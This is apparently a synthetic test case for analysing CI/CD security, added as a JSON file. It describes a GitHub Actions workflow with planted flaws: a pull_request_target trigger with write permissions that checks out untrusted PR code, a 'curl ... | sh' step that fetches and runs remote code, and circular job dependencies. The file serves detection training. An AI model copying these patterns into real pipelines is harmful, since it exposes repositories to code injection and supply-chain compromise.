@@ -1,0 +1,54 @@
+{
+  "case_id": "case-employee-examples",
+  "task_id": "example-cicdint",
+  "discipline": "CICDINT",
+  "objective": "Analyze supplied synthetic CICDINT evidence",
+  "as_of": "2026-10-15T00:00:00Z",
+  "sources": [
+    {
+      "source_id": "CICDINT-S1",
+      "uri": "urn:synthetic:employee-example"
+    }
+  ],
+  "records": [
+    {
+      "record_id": "CICDINT-R1",
+      "source_id": "CICDINT-S1",
+      "data": {
+        "kind": "workflow",
+        "workflow_id": "W",
+        "triggers": [
+          "pull_request_target"
+        ],
+        "permissions": {
+          "contents": "write"
+        },
+        "jobs": [
+          {
+            "job_id": "build",
+            "needs": [
+              "deploy"
+            ],
+            "steps": [
+              {
+                "uses": "actions/checkout@v4",
+                "with": {
+                  "ref": "${{ github.event.pull_request.head.sha }}"
+                },
+                "run": "curl https://example.invalid/fixture | sh"
+              }
+            ]
+          },
+          {
+            "job_id": "deploy",
+            "needs": [
+              "build"
+            ],
+            "steps": []
+          }
+        ]
+      }
+    }
+  ],
+  "parameters": {}
+}
